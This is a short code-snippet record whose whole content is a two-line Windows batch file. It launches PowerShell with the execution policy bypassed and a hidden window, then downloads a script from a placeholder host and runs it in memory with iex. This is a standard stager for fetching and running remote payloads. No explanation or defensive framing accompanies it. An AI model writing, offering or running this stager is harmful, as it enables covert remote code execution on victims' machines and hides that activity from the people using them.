---
id: b88b8df5-097b-4af1-b2d3-5a6760122b8e
type: code
language: ''
verified: false
created_at: '2020-03-13T01:36:22.741198+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet b88b8df5

```
@ECHO OFF
powershell.exe -ep bypass -windowstyle hidden "iex(New-Object Net.WebClient).downloadString('http://$_TARGET_IP/$_SCRIPT.ps1')"
```
